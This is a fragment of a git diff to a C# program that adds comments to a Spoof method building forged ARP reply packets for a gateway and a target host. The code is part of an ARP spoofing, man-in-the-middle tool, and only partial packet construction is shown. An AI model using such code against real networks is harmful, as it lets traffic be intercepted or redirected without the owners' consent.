@@ -113,8 +113,10 @@ class Program
         return string.IsNullOrEmpty(targetMac) ? null : FormatedMac(PhysicalAddress.Parse(targetMac));
     }
 
+    // Arp Spoof on the targetIp
     static void Spoof(ILiveDevice device, IPAddress targetIp, PhysicalAddress targetMac, PhysicalAddress gatewayMac)
     {
+        // Build arp reply to gateway
         var arpRequestToGateway = new ArpPacket(
             ArpOperation.Response,
             device.MacAddress,
@@ -123,6 +125,7 @@ class Program
             gatewayIp
         );
 
+        // Build arp reply to target
         var arpRequestToTarget = new ArpPacket(
             ArpOperation.Response,
             device.MacAddress,
